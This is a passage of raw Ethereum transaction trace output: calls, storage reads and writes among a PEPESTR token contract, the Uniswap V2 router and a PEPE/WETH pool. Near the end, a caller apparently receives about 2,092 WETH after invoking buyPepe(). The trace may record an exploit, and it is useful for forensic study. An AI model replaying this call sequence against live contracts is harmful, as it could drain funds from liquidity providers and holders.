          [906] STATICCALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=598, value=0
                args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
                returns: uint256=464,530,721,628,089,112,295,375,562

            [907] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x000000000000000000000000000000000000000001804034e0f72e0d718c02ca (464530721628089112295375562)

      [1045] CALL 0x7f07e5...e4b045 -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: transfer(address,uint256)
            status=OK, gasUsed=111023, value=0
            args: recipient:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f, amount:uint256=1
            returns: bool=True

        [1046] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000011
              value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

        [1047] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
              value=0x0000000000000000000000000000000000000000004e77a4058e109de946295e (94861201207706339066128734)

        [1048] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x000000000000000000000000000000000000000000000000000000000000000f
              value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

        [1049] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000011
              value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

        [1050] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x000000000000000000000000000000000000000000000000000000000000000c
              value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

        [1051] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0xe177c4ea682f7fc3faa20b837be764300ece9345212304703d4a6ec0587b51af
              value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

        [1052] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0xde610423843eb8562fb81bd4fd442fc6941e37ba18c59f29a3fc944467eee171
              value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

        [1053] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0xf35870bfd952eda30d0ffcc70c6a13b5f9b7ce6cf825a0fb8824c32c6c9fd0fd
              value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

        [1054] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x000000000000000000000000000000000000000000000000000000000000000c
              value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

        [1055] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x000000000000000000000000000000000000000000000000000000000000000c
              prev=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)
              curr=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)

        [1056] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
              value=0x0000000000000000000000000000000000000000004e77a4058e109de946295e (94861201207706339066128734)

        [1057] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000016
              value=0x00000000000000000000000000000000000000000025162521ed16a4797c9a9f (44834832362530207312943775)

        [1058] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x000000000000000000000000000000000000000000000000000000000000000f
              value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

        [1059] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: WETH()
              status=OK, gasUsed=275, value=0
              returns: address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2

          [1060] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x2a1b6066f3c122ec9cf1f62d3136b82dde9ba76705076a31a3b04f5cc34cbcd0
                prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                curr=0x000000000000000000000000000000000000000000084595161401484a000000 (10000000000000000000000000)

        [1062] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)
              status=OK, gasUsed=68591, value=0
              args: amountIn:uint256=10,000,000,000,000,000,000,000,000, amountOutMin:uint256=0, path:address[]=['0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2'], to:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91, deadline:uint256=1,767,358,691

          [1063] CALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: transferFrom(address,address,uint256)
                status=OK, gasUsed=7139, value=0
                args: sender:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91, recipient:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f, amount:uint256=10,000,000,000,000,000,000,000,000
                returns: bool=True

            [1064] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000011
                  value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

            [1065] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  value=0x0000000000000000000000000000000000000000004e77a4058e109de946295e (94861201207706339066128734)

            [1066] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000f
                  value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

            [1067] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000011
                  value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

            [1068] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000c
                  value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)

            [1069] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x32eeeeb6b25952bae39741d22f889cede7ecc0dc7069d6ac9117cfeda9a3bd3d
                  value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

            [1070] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  value=0x0000000000000000000000000000000000000000004e77a4058e109de946295e (94861201207706339066128734)

            [1071] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  prev=0x0000000000000000000000000000000000000000004e77a4058e109de946295e (94861201207706339066128734)
                  curr=0x00000000000000000000000000000000000000000046320eef7a0f559f46295e (84861201207706339066128734)

            [1072] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x000000000000000000000000000000000000000001804034e0f72e0d718c02ca (464530721628089112295375562)

            [1073] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  prev=0x000000000000000000000000000000000000000001804034e0f72e0d718c02ca (464530721628089112295375562)
                  curr=0x0000000000000000000000000000000000000000018885c9f70b2f55bb8c02ca (474530721628089112295375562)

            [1075] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x2a1b6066f3c122ec9cf1f62d3136b82dde9ba76705076a31a3b04f5cc34cbcd0
                  value=0x000000000000000000000000000000000000000000084595161401484a000000 (10000000000000000000000000)

            [1076] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x2a1b6066f3c122ec9cf1f62d3136b82dde9ba76705076a31a3b04f5cc34cbcd0
                  prev=0x000000000000000000000000000000000000000000084595161401484a000000 (10000000000000000000000000)
                  curr=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [1080] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=598, value=0
                args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
                returns: uint256=474,530,721,628,089,112,295,375,562

            [1081] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x0000000000000000000000000000000000000000018885c9f70b2f55bb8c02ca (474530721628089112295375562)

            [1094] STATICCALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                  status=OK, gasUsed=598, value=0
                  args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
                  returns: uint256=474,530,721,628,089,112,295,375,562

              [1095] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    value=0x0000000000000000000000000000000000000000018885c9f70b2f55bb8c02ca (474530721628089112295375562)

          [1110] CALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: <selector fallback>
                status=OK, gasUsed=55, value=0.053245868976619947

            [1111] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000016
                  prev=0x00000000000000000000000000000000000000000025162521ed16a4797c9a9f (44834832362530207312943775)
                  curr=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [1112] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000d
                  value=0x0000000000000000000000005763e08a55a9cf48b26537a356cef2e3fcd53282 (498909531061210001713288943164667751588544459394)

        [1113] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x5763e0...d53282 :: <selector fallback>
              status=OK, gasUsed=0, value=0.010649173795323989

          [1114] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000c
                value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)

          [1115] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000c
                prev=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)
                curr=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

          [1116] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000c
                value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

          [1117] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0xde610423843eb8562fb81bd4fd442fc6941e37ba18c59f29a3fc944467eee171
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [1118] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0xf35870bfd952eda30d0ffcc70c6a13b5f9b7ce6cf825a0fb8824c32c6c9fd0fd
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [1119] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x6d3dbbe4e1df997eecb6a1f8f59ad7cc74d529749dd03c44dee5a5c7cdd189cd
                value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

          [1120] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000014
                value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

          [1121] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000015
                value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

          [1122] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000016
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [1123] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000016
                prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                curr=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [1124] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                value=0x0000000000000000000000000000000000000000000000000000000000000064 (100)

          [1125] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                prev=0x0000000000000000000000000000000000000000000000000000000000000064 (100)
                curr=0x0000000000000000000000000000000000000000000000000000000000000063 (99)

          [1126] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                value=0x0000000000000000000000000000000000000000018885c9f70b2f55bb8c02ca (474530721628089112295375562)

          [1127] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                prev=0x0000000000000000000000000000000000000000018885c9f70b2f55bb8c02ca (474530721628089112295375562)
                curr=0x0000000000000000000000000000000000000000018885c9f70b2f55bb8c02cb (474530721628089112295375563)

      [1223] CALL 0x7f07e5...e4b045 -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: <selector fallback>
            status=OK, gasUsed=55, value=1.288435604855704584

            [1262] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: transfer(address,uint256)
                  status=OK, gasUsed=4106, value=0
                  args: recipient:address=0x4250569cdce5065c96b597b5982f6e6d9c329714, amount:uint256=1,668,594,984,594,785,041,041,914,948
                  returns: bool=True

            [1272] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                  status=OK, gasUsed=624, value=0
                  args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=2,463,695,869,979,630,693,969,123,836,244

            [1274] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                  status=OK, gasUsed=534, value=0
                  args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=8,196,505,520,683,047,896,793

      [1298] CALL 0x7f07e5...e4b045 -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: buyPepe()
            status=OK, gasUsed=156101, value=0

        [1299] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000006
              value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

        [1300] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000006
              prev=0x0000000000000000000000000000000000000000000000000000000000000001 (1)
              curr=0x0000000000000000000000000000000000000000000000000000000000000002 (2)

        [1301] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x000000000000000000000000000000000000000000000000000000000000000b
              value=0x000000000000000000000000000000000000000000000000002386f26fc10000 (10000000000000000)

        [1302] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x000000000000000000000000000000000000000000000000000000000000000a
              value=0x0000000000000000000000000000000000000000000000004563918244f40000 (5000000000000000000)

        [1303] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x698250...311933(PEPE) :: balanceOf(address)
              status=OK, gasUsed=624, value=0
              args: account:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91
              returns: uint256=627,320,000,000,000,000,000

        [1305] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: WETH()
              status=OK, gasUsed=275, value=0
              returns: address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2

          [1306] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000b
                value=0x000000000000000000000000000000000000000000000000002386f26fc10000 (10000000000000000)

        [1307] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: swapExactETHForTokensSupportingFeeOnTransferTokens(uint256,address[],address,uint256)
              status=OK, gasUsed=58492, value=5.001
              args: amountOutMin:uint256=0, path:address[]=['0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', '0x6982508145454ce325ddbe47a25d4ec3d2311933'], to:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91, deadline:uint256=1,767,358,691

            [1330] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: transfer(address,uint256)
                  status=OK, gasUsed=4106, value=0
                  args: recipient:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91, amount:uint256=1,497,773,934,185,705,183,558,875,637
                  returns: bool=True

            [1340] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                  status=OK, gasUsed=624, value=0
                  args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=2,462,198,096,045,444,988,785,564,960,607

            [1342] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                  status=OK, gasUsed=534, value=0
                  args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=8,201,506,520,683,047,896,793

        [1351] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x698250...311933(PEPE) :: balanceOf(address)
              status=OK, gasUsed=624, value=0
              args: account:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91
              returns: uint256=1,497,774,561,505,705,183,558,875,637

          [1353] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000008
                value=0x0000000000000000000000000000000000000000000000000000000000000009 (9)

          [1354] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000008
                prev=0x0000000000000000000000000000000000000000000000000000000000000009 (9)
                curr=0x000000000000000000000000000000000000000000000000000000000000000a (10)

          [1355] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000b
                value=0x000000000000000000000000000000000000000000000000002386f26fc10000 (10000000000000000)

          [1356] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x87e8a52529e8ece4ef759037313542a6429ff494a9fab9027fb79db90124eba6
                prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                curr=0x00000000000000000000000000000000000000000000000045671f00e9ba8000 (5001000000000000000)

          [1357] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x87e8a52529e8ece4ef759037313542a6429ff494a9fab9027fb79db90124eba7
                prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                curr=0x000000000000000000000000000000000000000004d6edf7aab46561d3f1b9f5 (1497773934185705183558875637)

          [1358] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x87e8a52529e8ece4ef759037313542a6429ff494a9fab9027fb79db90124eba8
                prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                curr=0x000000000000000000000000000000000000000000000000000000006957c0e3 (1767358691)

          [1359] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x87e8a52529e8ece4ef759037313542a6429ff494a9fab9027fb79db90124eba9
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [1360] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x87e8a52529e8ece4ef759037313542a6429ff494a9fab9027fb79db90124eba9
                prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                curr=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [1361] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000b
                value=0x000000000000000000000000000000000000000000000000002386f26fc10000 (10000000000000000)

        [1362] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7f07e5...e4b045 :: <selector fallback>
              status=OK, gasUsed=40, value=0.01

          [1363] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000006
                prev=0x0000000000000000000000000000000000000000000000000000000000000002 (2)
                curr=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

          [1394] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: transfer(address,uint256)
                status=OK, gasUsed=3262, value=0
                args: dst:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045, wad:uint256=2,091,978,752,136,290,103,338
                returns: bool=True

          [1400] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                status=OK, gasUsed=624, value=0
                args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=3,307,822,404,795,349,140,809,011,714,986

          [1402] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                status=OK, gasUsed=534, value=0
                args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=6,109,527,768,546,757,793,455
